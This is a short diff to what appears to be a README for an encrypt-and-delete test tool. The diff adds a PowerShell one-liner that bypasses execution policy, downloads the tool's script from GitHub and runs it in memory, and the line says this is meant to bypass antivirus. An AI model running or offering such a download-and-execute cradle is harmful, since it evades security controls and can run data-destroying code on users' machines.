@@ -54,6 +54,7 @@ EncryptDelTestv4.exe
 EncryptDelTestv4.ps1
 - runs on Windows
 - requires PowerShell
+- (download and run in memory directly, bypass antivirus) powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/EncryptDelTestv4.ps1')"
 
 | EncryptDelTestv4.jar | EncryptDelTestv4.exe | EncryptDelTestv4.ps1 | 
 |---------------|---------------|---------------|
